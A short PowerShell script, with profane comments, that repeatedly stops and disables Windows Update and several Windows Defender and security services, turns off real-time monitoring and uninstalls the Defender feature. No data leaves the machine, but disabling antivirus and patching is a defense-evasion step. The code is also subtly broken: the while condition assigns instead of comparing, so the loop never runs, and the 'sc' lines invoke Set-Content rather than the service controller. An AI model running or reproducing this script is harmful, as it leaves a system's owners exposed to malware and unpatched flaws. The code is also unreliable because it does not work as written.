#Rant
#IS
#KING
#This script fucks windows updates into oblivion
#
[Array] $Servs = 'wuauserv', 'SecurityHealthService', 'Sense', 'WdNisSvc', 'WinDefend'
#Looper variable, helps the script run perpetually
$Looper = 0
while($Looper = 0)
{
    foreach($ServiceName in $Servs)
    {
        Get-Service $ServiceName | Where {$_.Status -eq 'Running'} | Stop-Service
        Set-Service $ServiceName -StartupType Disabled 
    }
    sc stop WinDefend 
    sc config WinDefend start = disabled
    Set-MpPreference -DisableRealtimeMonitoring $true
    Uninstall-WindowsFeature -Name Windows-Defender
    Start-Sleep -s 1800
}